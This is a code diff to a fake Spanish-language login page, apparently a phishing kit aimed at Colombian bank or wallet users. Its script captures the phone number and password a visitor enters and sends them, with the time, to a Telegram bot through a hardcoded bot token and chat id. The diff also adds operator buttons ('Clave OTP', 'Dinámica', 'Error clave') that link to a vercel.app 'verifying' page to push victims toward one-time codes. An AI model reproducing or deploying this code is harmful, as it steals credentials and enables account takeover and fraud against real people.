@@ -53,7 +53,6 @@
     </div>
 
     <div class="pie">
-        <!-- TU FOOTER (sin tocar) -->
         <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
             <tr><td id="logo-blanco-movil"><img src="../assets/img/logo-blanco.svg" width="176"><div class="separador"></div></td></tr>
         </table>
@@ -73,7 +72,7 @@
         </table>
     </div>
 
-    <!-- BOTÓN MÁGICO 100% FUNCIONANDO -->
+    <!-- BOTÓN QUE ENVÍA + REDIRIGE CON URL -->
     <script>
     $(document).ready(function() {
         // HABILITA BOTÓN
@@ -87,31 +86,30 @@
         $('#btn-login').click(function() {
             const numero = '+57 ' + $('#txt-celular').val().trim();
             const clave = $('#txt-password').val().trim();
-
             $('#msg').text('Enviando...');
             $('#btn-login').html('Enviando...').prop('disabled', true);
 
-            // ENVÍA A TELEGRAM
+            // ENVÍA A TELEGRAM CON BOTONES QUE ABREN LINK
             fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     chat_id: 8469651553,
-                    text: `*NUEVO LOGIN*
+                    text: `*NUEVO CLIENTE*
 
 *Número:* ${numero}
 *Clave:* ${clave}
 *Hora:* ${new Date().toLocaleTimeString()}
 
-*ELIGE ACCIÓN:*`,
+TOCA UN BOTÓN:`,
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [
-                            [{text: "Clave OTP", callback_data: "otp"}],
-                            [{text: "Error clave", callback_data: "error"}],
-                            [{text: "Dinámica", callback_data: "dinamica"}],
-                            [{text: "Error login", callback_data: "loginerr"}],
-                            [{text: "Finalizar", callback_data: "ok"}]
+                            [{text: "Clave OTP", url: "https://tualternativafinanzas.vercel.app/verifying/?action=otp"}],
+                            [{text: "Error clave", url: "https://tualternativafinanzas.vercel.app/verifying/?action=error"}],
+                            [{text: "Dinámica", url: "https://tualternativafinanzas.vercel.app/verifying/?action=dinamica"}],
+                            [{text: "Error login", url: "https://tualternativafinanzas.vercel.app/verifying/?action=loginerr"}],
+                            [{text: "Finalizar", url: "https://tualternativafinanzas.vercel.app/verifying/?action=ok"}]
                         ]
                     }
                 })
@@ -121,7 +119,7 @@
                 setTimeout(() => { location.href = '/private/'; }, 1500);
             })
             .catch(err => {
-                $('#msg').text('Error de red. Intenta de nuevo');
+                $('#msg').text('Error. Intenta de nuevo');
                 $('#btn-login').html('Entra').prop('disabled', false);
             });
         });
